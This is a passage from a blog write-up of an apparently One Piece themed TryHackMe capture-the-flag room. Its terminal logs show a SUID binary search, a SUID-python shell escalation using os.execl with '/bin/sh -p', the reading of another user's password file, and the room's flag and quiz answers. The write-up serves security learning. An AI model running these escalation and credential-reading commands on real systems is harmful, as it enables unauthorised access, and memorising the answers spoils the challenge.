+</span></span><span class=line><span class=cl>-rw-r--r--  1 M0nk3y_D_7uffy luffy  220 Jul 26 07:54 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r--  1 M0nk3y_D_7uffy luffy 3771 Jul 26 07:54 .bashrc
+</span></span><span class=line><span class=cl>drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .cache
+</span></span><span class=line><span class=cl>drwx------ 11 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .config
+</span></span><span class=line><span class=cl>drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .gnupg
+</span></span><span class=line><span class=cl>-rw-------  1 M0nk3y_D_7uffy luffy  334 Jul 29 07:14 .ICEauthority
+</span></span><span class=line><span class=cl>-rw-r--r--  1 root           root   283 Jul 26 08:23 laugh_tale.txt
+</span></span><span class=line><span class=cl>drwx------  3 M0nk3y_D_7uffy luffy 4096 Jul 29 07:14 .local
+</span></span><span class=line><span class=cl>drwx------  5 M0nk3y_D_7uffy luffy 4096 Jul 29 07:15 .mozilla
+</span></span><span class=line><span class=cl>-rw-r--r--  1 M0nk3y_D_7uffy luffy  807 Jul 26 07:54 .profile
+</span></span><span class=line><span class=cl>drwx------  2 M0nk3y_D_7uffy luffy 4096 Jul 29 07:21 .ssh
+</span></span><span class=line><span class=cl>M0nk3y_D_7uffy@Laugh-Tale:~$ cat laugh_tale.txt
+</span></span><span class=line><span class=cl>Finally, we reached Laugh Tale.
+</span></span><span class=line><span class=cl>All is left to do is to find the One Piece.
+</span></span><span class=line><span class=cl>Wait, there is another boat in here.
+</span></span><span class=line><span class=cl>Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
+</span></span><span class=line><span class=cl>You want your revenge. Let&#39;s take him down !
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>find / -type f -perm -4000 -exec ls -l {} \; 2&gt; /dev/null
+</span></span></code></pre></td></tr></table></div></div><p><code>-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17 08:50 /usr/bin/gomugomunooo_king_kobraaa</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c &#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;
+</span></span><span class=line><span class=cl>$ whoami
+</span></span><span class=line><span class=cl>7uffy_vs_T3@ch
+</span></span><span class=line><span class=cl>$ pwd
+</span></span><span class=line><span class=cl>/home/luffy
+</span></span><span class=line><span class=cl>$ cd ..
+</span></span><span class=line><span class=cl>$ ls -la
+</span></span><span class=line><span class=cl>total 16
+</span></span><span class=line><span class=cl>drwxr-xr-x  4 root           root  4096 Jul 26 07:54 .
+</span></span><span class=line><span class=cl>drwxr-xr-x 24 root           root  4096 Jul 29 08:04 ..
+</span></span><span class=line><span class=cl>drwxr-xr-x  8 M0nk3y_D_7uffy luffy 4096 Jul 29 07:32 luffy
+</span></span><span class=line><span class=cl>drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 teach
+</span></span><span class=line><span class=cl>$ cd teach
+</span></span><span class=line><span class=cl>$ ls -la
+</span></span><span class=line><span class=cl>total 56
+</span></span><span class=line><span class=cl>drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 .
+</span></span><span class=line><span class=cl>drwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..
+</span></span><span class=line><span class=cl>-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14 15:24 .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26 07:09 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc
+</span></span><span class=line><span class=cl>drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache
+</span></span><span class=line><span class=cl>drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config
+</span></span><span class=line><span class=cl>drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg
+</span></span><span class=line><span class=cl>-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26 07:15 .ICEauthority
+</span></span><span class=line><span class=cl>drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local
+</span></span><span class=line><span class=cl>-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26 08:06 luffy_vs_teach.txt
+</span></span><span class=line><span class=cl>-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26 08:02 .password.txt
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26 07:09 .profile
+</span></span><span class=line><span class=cl>drwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26 07:16 .sudo_as_admin_successful
+</span></span><span class=line><span class=cl>$ cat luffy_vs_teach.txt
+</span></span><span class=line><span class=cl>This fight will determine who can take the One Piece and who will be the next Pirate King.
+</span></span><span class=line><span class=cl>These 2 monsters have a matchless will and none of them can let the other prevail.
+</span></span><span class=line><span class=cl>Each of them have the same dream, be the Pirate King.
+</span></span><span class=line><span class=cl>For one it means: Take over the World.
+</span></span><span class=line><span class=cl>For the other: Be the freest man in the World.
+</span></span><span class=line><span class=cl>Each of their hit creates an earthquake felt on the entire island.
+</span></span><span class=line><span class=cl>But in the end, Luffy thanks to his willpower won the fight.
+</span></span><span class=line><span class=cl>Now, he needs to find the One Piece.
+</span></span><span class=line><span class=cl>$ cat .password.txt
+</span></span><span class=line><span class=cl>7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?
+</span></span><span class=line><span class=cl>$
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@Laugh-Tale:~# ls -la
+</span></span><span class=line><span class=cl>ls -la
+</span></span><span class=line><span class=cl>total 56
+</span></span><span class=line><span class=cl>drwxr-xr-x  7 7uffy_vs_T3@ch teach 4096 Jul 26 08:33 .
+</span></span><span class=line><span class=cl>drwxr-xr-x  4 root           root  4096 Jul 26 07:54 ..
+</span></span><span class=line><span class=cl>-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14 15:24 .bash_history
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26 07:09 .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach 3771 Jul 26 07:09 .bashrc
+</span></span><span class=line><span class=cl>drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .cache
+</span></span><span class=line><span class=cl>drwx------ 11 7uffy_vs_T3@ch teach 4096 Jul 26 08:45 .config
+</span></span><span class=line><span class=cl>drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .gnupg
+</span></span><span class=line><span class=cl>-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26 07:15 .ICEauthority
+</span></span><span class=line><span class=cl>drwx------  3 7uffy_vs_T3@ch teach 4096 Jul 26 07:15 .local
+</span></span><span class=line><span class=cl>-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26 08:06 luffy_vs_teach.txt
+</span></span><span class=line><span class=cl>-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26 08:02 .password.txt
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26 07:09 .profile
+</span></span><span class=line><span class=cl>drwx------  2 7uffy_vs_T3@ch teach 4096 Jul 26 07:16 .ssh
+</span></span><span class=line><span class=cl>-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26 07:16 .sudo_as_admin_successful
+</span></span><span class=line><span class=cl>root@Laugh-Tale:~# cd ~
+</span></span><span class=line><span class=cl>cd ~
+</span></span><span class=line><span class=cl>root@Laugh-Tale:~# pwd
+</span></span><span class=line><span class=cl>pwd
+</span></span><span class=line><span class=cl>/home/teach
+</span></span><span class=line><span class=cl>root@Laugh-Tale:~# cd /root
+</span></span><span class=line><span class=cl>cd /t
+</span></span><span class=line><span class=cl>bash: cd: /t: No such file or directory
+</span></span><span class=line><span class=cl>root@Laugh-Tale:~# grep -iRl &#34;One Piece&#34; /home /usr 2&gt; /dev/null
+</span></span><span class=line><span class=cl>/usr/share/mysterious/on3_p1ec3.txt
+</span></span><span class=line><span class=cl>root@Laugh-Tale:~# cat /usr/share/mysterious/on3_p1ec3.txt
+</span></span><span class=line><span class=cl>cat /usr/share/mysterious/on3_p1ec3.txt
+</span></span><span class=line><span class=cl>One Piece: S3cr3ts_0f_tH3_W0rlD_&amp;_0f_Th3_P@st$
+</span></span></code></pre></td></tr></table></div></div><ol><li>What is the name of the tree that contains the 1st Road Poneglyph?</li></ol><p><code>the whale</code></p><ol start=2><li>What is the name of the 1st pirate you meet navigating the Apache Sea?</li></ol><p><code>Donquixote Doflamingo</code></p><ol start=3><li>What is the name of the 2nd island you reach navigating the Apache Sea?</li></ol><p><code>Whole Cake</code></p><ol start=4><li>What is the name of the friend you meet navigating the Apache Sea?</li></ol><p><code>Buggy the Clown</code></p><ol start=5><li>What is the name of the 2nd Emperor you meet navigating the Apache Sea?</li></ol><p><code>Kaido of the Beasts</code></p><ol start=6><li>What is the hidden message of the 4 Road Poneglyphs?</li></ol><p><code>M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!</code></p><h2 id=task-3-laugh-tale>Task 3 Laugh Tale<a hidden class=anchor aria-hidden=true href=#task-3-laugh-tale>#</a></h2><p>You are now able to reach Laugh Tale. Can you find the One Piece?</p><ol><li>Who is on Laugh Tale at the same time as Luffy?</li></ol><p><code>Marshall D Teach</code></p><ol start=2><li>What allowed Luffy to win the fight?</li></ol><p><code>willpower</code></p><ol start=3><li>What is the One Piece?</li></ol><p><code>S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
